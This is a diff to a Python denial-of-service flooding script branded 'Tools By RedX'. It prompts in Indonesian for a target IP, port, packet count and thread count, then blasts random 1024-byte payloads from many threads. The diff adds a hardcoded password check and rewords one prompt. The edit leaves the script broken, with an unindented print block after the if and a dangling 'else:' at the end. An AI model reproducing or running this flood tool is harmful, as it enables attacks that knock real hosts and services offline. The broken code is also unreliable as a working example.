@@ -7,7 +7,11 @@ import os
 
 os.system("clear")
 print("\033[93m")
-print('''\033[94m  Tools By RedX
+Password = input("PASSWORD:")
+
+if Password=="RedX":
+     
+print('''\033[94m      Tools By RedX
 ██████╗░███████╗██████ ╗██╗░░██╗
 ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
 ██████╔╝█████╗░░██║░░██║░╚███╔╝
@@ -24,7 +28,7 @@ ip = str(input("MASUKIN IPNYA WOE | ip:"))
 port = int(input("MASUKIN PORTNYA WOE | port:"))
 choice = str(input("Serang Ga Ni WOY?(y/n):"))
 times = int(input("Packetnya berapa | Packets:"))
-threads = int(input("Berapa Lama | Threads:"))
+threads = int(input("Mau Berapa Lama | Threads:"))
 def run():
         data = random._urandom(1024)
         i = random.choice(("[*]","[!]","[#]"))
@@ -58,3 +62,4 @@ for y in range(threads):
         else:
                  th = threading.Thread(target = run2)
                  th.start()
+else:
